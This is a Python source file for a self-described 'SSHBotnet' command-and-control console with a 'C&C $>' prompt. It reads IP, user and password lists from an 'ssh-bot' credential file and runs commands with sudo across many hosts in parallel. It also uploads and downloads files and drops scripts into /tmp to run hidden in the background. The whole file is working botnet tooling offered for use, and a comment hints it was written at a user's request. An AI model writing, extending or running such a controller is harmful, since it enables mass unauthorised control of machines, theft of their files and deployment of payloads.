#!/usr/bin/env python3
import sys
import os
import readline
import glob
from fabric import Connection, Config
from termcolor import colored
import threading
from concurrent.futures import ThreadPoolExecutor

# enable tab autocomplete (used for local path)
def complete(text, state):
    return (glob.glob(text+'*')+[None])[state]

readline.set_completer_delims(' \t\n;')
readline.set_completer(complete)
readline.parse_and_bind("tab: complete")

class SSHBotnet:
    def __init__(self):
        self.hosts = [] # List of dicts: {'host': 'ip', 'user': 'user', 'port': 22, 'password': 'pw'}
        self.running_hosts = {} # ip: status/info

    def load_hosts(self, filepath):
        print(f"Loading hosts from {filepath}...\n")
        if not os.path.exists(filepath):
            print(colored(f"Error: {filepath} not found.", "red"))
            return
        
        with open(filepath, "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                try:
                    # Format: IP,user,password
                    parts = line.split(',')
                    if len(parts) == 3:
                        ip, user, pw = parts
                        self.hosts.append({'host': ip, 'user': user, 'port': 22, 'password': pw})
                    else:
                        print(colored(f"Skipping invalid line: {line}", "yellow"))
                except Exception as e:
                    print(colored(f"Error parsing line {line}: {e}", "red"))

    def run_on_host(self, host_info, command, sudo_cmd=False):
        try:
            config = Config(overrides={'sudo': {'password': host_info['password']}})
            with Connection(
                host=host_info['host'],
                user=host_info['user'],
                port=host_info['port'],
                connect_kwargs={"password": host_info['password']},
                config=config,
                connect_timeout=2
            ) as c:
                if sudo_cmd:
                    result = c.sudo(command, hide=True, warn=True)
                else:
                    result = c.run(command, hide=True, warn=True)
                
                if result.ok:
                    return result.stdout.strip()
                else:
                    return f"Error: {result.stderr.strip()}"
        except Exception as e:
            return "Host Down"

    def check_hosts(self):
        print("Checking hosts status...")
        self.running_hosts = {}
        
        def check(h):
            res = self.run_on_host(h, "uname -a")
            self.running_hosts[h['host']] = res

        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(check, self.hosts)
        print(colored("Host List Updated\n", "green"))

    def list_hosts(self):
        print("\n{0:5} | {1:30} | {2:15}".format("ID", "Host", "SysInfo"))
        print("-" * 70)
        for idx, h in enumerate(self.hosts):
            status = self.running_hosts.get(h['host'], "Unknown")
            print("{0:5} | {1:30} | {2}".format(idx, h['host'], status))
        print("\n")

    def active_hosts(self):
        print("\nActive Hosts:")
        print(colored("ID\tHost\t\t\tStatus", "cyan"))
        print(colored("----\t---------------\t\t---------------------", "green"))
        flag = 0
        for idx, h in enumerate(self.hosts):
            status = self.running_hosts.get(h['host'], "Host Down")
            if status != "Host Down" and not status.startswith("Error"):
                uptime = self.run_on_host(h, "uptime")
                print(f"{idx}\t{h['host']}\t{uptime}")
                flag = 1
        if flag == 0:
            print(colored("No active hosts\n", "red"))
        print("\n")

    def get_selected_hosts(self):
        tmp = input("Hosts id (0 1 2... / all) [default is all]: ").strip()
        if tmp == "" or tmp == "all":
            return self.hosts
        try:
            indices = [int(i) for i in tmp.split()]
            return [self.hosts[i] for i in indices if i < len(self.hosts)]
        except:
            print(colored("Invalid input, using all hosts.", "yellow"))
            return self.hosts

    def run_command_menu(self):
        cmd = input("Command: ")
        selected = self.get_selected_hosts()
        
        def run_cmd(h):
            res = self.run_on_host(h, cmd, sudo_cmd=cmd.startswith("sudo"))
            print(f"\n[{h['host']}]: {cmd}")
            print('-' * 80)
            print(res + '\n')

        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(run_cmd, selected)

    def upload(self):
        local_path = input("Local path: ").strip()
        remote_path = input("Remote path: ").strip()
        selected = self.get_selected_hosts()
        
        def up(h):
            try:
                with Connection(h['host'], user=h['user'], connect_kwargs={"password": h['password']}) as c:
                    remote_dir = os.path.dirname(remote_path)
                    if remote_dir:
                        c.run(f"mkdir -p {remote_dir}", hide=True)
                    c.put(local_path, remote=remote_path)
                    print(colored(f"[{h['host']}] Upload successful", "green"))
            except Exception as e:
                print(colored(f"[{h['host']}] Upload failed: {e}", "red"))

        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(up, selected)

    def download(self):
        remote_path = input("Remote path: ").strip()
        local_path = input("Local path: ").strip()
        selected = self.get_selected_hosts()
        
        def down(h):
            try:
                # Append hostname to local path to avoid overwriting
                l_path = f"{local_path}_{h['host']}" if not os.path.isdir(local_path) else os.path.join(local_path, f"{os.path.basename(remote_path)}_{h['host']}")
                with Connection(h['host'], user=h['user'], connect_kwargs={"password": h['password']}) as c:
                    c.get(remote_path, local=l_path)
                    print(colored(f"[{h['host']}] Download successful -> {l_path}", "green"))
            except Exception as e:
                print(colored(f"[{h['host']}] Download failed: {e}", "red"))

        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(down, selected)

    def script_exec(self):
        local_path = input("Local script path: ").strip()
        selected = self.get_selected_hosts()
        
        def exec_script(h):
            try:
                with Connection(h['host'], user=h['user'], connect_kwargs={"password": h['password']}) as c:
                    c.put(local_path, remote="/tmp/script.sh")
                    c.run("chmod +x /tmp/script.sh", hide=True)
                    # Run in background similar to nohup
                    c.run("nohup /tmp/script.sh &> /dev/null &", pty=False)
                    print(colored(f"[{h['host']}] Script execution started", "green"))
            except Exception as e:
                print(colored(f"[{h['host']}] Script exec failed: {e}", "red"))

        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(exec_script, selected)

def menu():
    options = ["List Hosts", "Active Hosts", "Update Hosts", "Run Command", "Open Shell (Not Implemented in Parallel mode)", "File Upload", "File Download", "Script Exec", "Exit"]
    for num, desc in enumerate(options):
        print(f"[{num}] {desc}")
    try:
        choice = input('\nC&C $> ')
        return int(choice)
    except (KeyboardInterrupt, ValueError):
        return 8

def main():
    botnet = SSHBotnet()
    # Path to the specific file requested by the user
    botnet.load_hosts("../ssh-bot/ssh_formatted.txt")
    botnet.check_hosts()
    
    while True:
        choice = menu()
        if choice == 0: botnet.list_hosts()
        elif choice == 1: botnet.active_hosts()
        elif choice == 2: botnet.check_hosts()
        elif choice == 3: botnet.run_command_menu()
        elif choice == 4: print(colored("Open Shell is tricky with Fabric 2 in a botnet script. Use 'Run Command' instead.", "yellow"))
        elif choice == 5: botnet.upload()
        elif choice == 6: botnet.download()
        elif choice == 7: botnet.script_exec()
        elif choice == 8: break
        else: print("Invalid choice")

if __name__ == "__main__":
    main()
